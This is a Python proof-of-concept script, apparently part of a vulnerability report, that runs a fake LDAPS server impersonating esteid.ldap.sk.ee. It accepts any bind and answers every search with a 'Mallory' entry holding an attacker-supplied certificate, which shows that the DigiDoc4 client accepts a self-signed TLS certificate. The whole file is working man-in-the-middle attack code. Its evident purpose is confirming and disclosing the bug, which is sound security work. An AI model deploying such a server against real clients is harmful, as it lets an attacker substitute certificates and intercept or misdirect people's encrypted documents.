"""
Fake LDAPS server for DigiDoc4 H1 PoC.

Accepts any anonymous bind, returns 'Mallory' as a search result for
*any* search filter with userCertificate;binary set to attacker cert.

If DigiDoc4 talks to this server (after /etc/hosts redirect), the bug
in client/LdapSearch.cpp:126 is confirmed — a correct LDAPS client
would reject the self-signed TLS certificate during handshake.
"""
import sys
from pathlib import Path

from twisted.internet import reactor, ssl, protocol, defer
from twisted.python import log
from ldaptor.protocols.ldap import ldapserver
from ldaptor.protocols import pureldap

CERT_PATH = Path("/data/mallory.cer")
TLS_KEY = "/data/ldap-tls.key"
TLS_CRT = "/data/ldap-tls.crt"

CERT_DER = CERT_PATH.read_bytes()
log.msg(f"Loaded attacker cert: {len(CERT_DER)} bytes DER")


class FakeLDAP(ldapserver.LDAPServer):
    """Returns Mallory entry for any search, accepts any bind."""

    debug = True

    def handle_LDAPBindRequest(self, request, controls, reply):
        log.msg(f"[BIND] dn={bytes(request.dn)!r} version={request.version}")
        return defer.succeed(pureldap.LDAPBindResponse(resultCode=0))

    def handle_LDAPSearchRequest(self, request, controls, reply):
        try:
            filter_text = request.filter.asText()
        except Exception:
            filter_text = "<unparseable>"
        log.msg(
            f"[SEARCH] base={bytes(request.baseObject)!r} "
            f"scope={request.scope} "
            f"filter={filter_text!r}"
        )
        entry = pureldap.LDAPSearchResultEntry(
            objectName=b"cn=MALLORY ORG OU,o=MALLORY OU,c=EE",
            attributes=[
                (b"cn",                     [b"MALLORY ORG OU"]),
                (b"o",                      [b"MALLORY OU"]),
                (b"serialNumber",           [b"12345678"]),
                (b"objectClass",            [b"organization"]),
                (b"userCertificate;binary", [CERT_DER]),
            ],
        )
        reply(entry)
        return defer.succeed(pureldap.LDAPSearchResultDone(resultCode=0))

    def handle_LDAPUnbindRequest(self, request, controls, reply):
        log.msg("[UNBIND]")
        self.transport.loseConnection()


class FakeFactory(protocol.ServerFactory):
    protocol = FakeLDAP


def main():
    log.startLogging(sys.stderr)
    ctx = ssl.DefaultOpenSSLContextFactory(TLS_KEY, TLS_CRT)
    reactor.listenSSL(636, FakeFactory(), ctx)
    log.msg("Fake LDAPS listening on 0.0.0.0:636 (TLS cert: esteid.ldap.sk.ee)")
    reactor.run()


if __name__ == "__main__":
    main()
